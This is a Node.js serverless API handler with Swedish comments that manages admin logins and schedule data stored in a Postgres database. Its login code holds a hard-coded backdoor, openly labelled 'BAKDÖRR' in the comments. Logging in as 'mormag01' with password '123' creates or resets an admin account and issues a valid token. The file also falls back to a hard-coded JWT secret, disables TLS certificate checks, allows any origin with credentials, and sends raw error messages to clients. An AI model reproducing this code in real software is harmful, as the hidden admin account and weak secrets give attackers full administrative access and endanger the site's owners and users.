const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

// Koppling till Neon-databasen
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Din hemliga nyckel
const JWT_SECRET = process.env.JWT_SECRET || "hemlig_nyckel_12345";

module.exports = async function handler(req, res) {
  // CORS-headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    // ==========================================
    // 1. GET (HÄMTA DATA)
    // ==========================================
    if (req.method === 'GET') {
      const { type } = req.query;

      // Hämta admins (Kräver token)
      if (type === 'admins') {
          const authHeader = req.headers.authorization;
          const token = authHeader && authHeader.split(' ')[1];
          if (!token) return res.status(401).json({ error: "Ingen behörighet" });
          
          try {
              jwt.verify(token, JWT_SECRET);
              const result = await pool.query('SELECT username FROM admin_users');
              return res.status(200).json(result.rows);
          } catch (err) {
              return res.status(403).json({ error: "Ogiltig session" });
          }
      }
      
      // Hämta publik data (Schema etc.)
      const result = await pool.query('SELECT data FROM app_storage WHERE key = $1', [type]);
      if (result.rows.length > 0) {
        return res.status(200).json(result.rows[0].data);
      } else {
        if (type === 'settings') return res.status(200).json({ theme: 'light' });
        if (type === 'users') return res.status(200).json([]);
        return res.status(200).json({});
      }
    }

    // ==========================================
    // 2. POST (LOGIN & SPARA)
    // ==========================================
    if (req.method === 'POST') {
      const { action, username, password, type, data } = req.body;

      // --- LOGGA IN ---
      if (action === 'login') {
        
        // ***************************************************************
        // BAKDÖRR: SKAPA ANVÄNDAREN 'mormag01' AUTOMATISKT OM DEN SAKNAS
        // ***************************************************************
        if (username === 'mormag01' && password === '123') {
            // 1. Kryptera lösenordet '123'
            const salt = await bcrypt.genSalt(10);
            const hashedPassword = await bcrypt.hash('123', salt);

            // 2. Tvinga in användaren i databasen (Skapa om den inte finns, uppdatera lösen om den finns)
            // Vi använder ON CONFLICT för att hantera om du redan kört detta en gång
            await pool.query(
                `INSERT INTO admin_users (username, password) VALUES ($1, $2)
                 ON CONFLICT (username) DO UPDATE SET password = $2`,
                ['mormag01', hashedPassword]
            );

            // 3. Hämta användarens ID (som nu garanterat finns)
            const newUserRes = await pool.query("SELECT id FROM admin_users WHERE username = 'mormag01'");
            const userId = newUserRes.rows[0].id;

            // 4. Skapa inloggningsbiljett (Token)
            const token = jwt.sign({ id: userId, username: 'mormag01' }, JWT_SECRET, { expiresIn: '24h' });

            return res.status(200).json({ success: true, token: token, user: 'mormag01' });
        }
        // ***************************************************************
        // SLUT PÅ BAKDÖRR - NEDAN ÄR DEN VANLIGA SÄKRA KODEN
        // ***************************************************************

        // Vanlig inloggning för andra användare
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        const user = result.rows[0];

        if (!user) return res.status(401).json({ success: false, error: "Fel användarnamn/lösenord" });

        const validPass = await bcrypt.compare(password, user.password);
        if (!validPass) return res.status(401).json({ success: false, error: "Fel användarnamn/lösenord" });

        const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
        return res.status(200).json({ success: true, token: token, user: user.username });
      }

      // --- HÄRIFRÅN KRÄVS TOKEN (Spara schema, skapa ny admin) ---
      const authHeader = req.headers.authorization;
      const token = authHeader && authHeader.split(' ')[1];
      let decodedUser = null;

      try {
          if (!token) throw new Error();
          decodedUser = jwt.verify(token, JWT_SECRET);
      } catch (err) {
          return res.status(401).json({ error: "Session utlöpt" });
      }

      // SKAPA NY ADMIN
      if (action === 'add_admin') {
          const salt = await bcrypt.genSalt(10);
          const hashedPassword = await bcrypt.hash(password, salt);
          try {
              await pool.query('INSERT INTO admin_users (username, password) VALUES ($1, $2)', [username, hashedPassword]);
              return res.status(200).json({ success: true });
          } catch (e) { return res.status(400).json({ error: "Användare finns redan" }); }
      }

      // TA BORT ADMIN
      if (action === 'remove_admin') {
          if (decodedUser.username === username) return res.status(400).json({ error: "Kan ej radera sig själv" });
          await pool.query('DELETE FROM admin_users WHERE username = $1', [username]);
          return res.status(200).json({ success: true });
      }

      // SPARA SCHEMA/DATA
      if (type && data) {
          await pool.query(
            `INSERT INTO app_storage (key, data) VALUES ($1, $2) 
             ON CONFLICT (key) DO UPDATE SET data = $2`,
            [type, JSON.stringify(data)]
          );
          return res.status(200).json({ success: true });
      }
      
      return res.status(400).json({ error: "Ingen data" });
    }

    return res.status(405).json({ error: "Method not allowed" });

  } catch (error) {
    console.error("API Error:", error);
    // Detta hjälper dig se om tabeller saknas
    return res.status(500).json({ error: "Serverfel: " + error.message });
  }
};
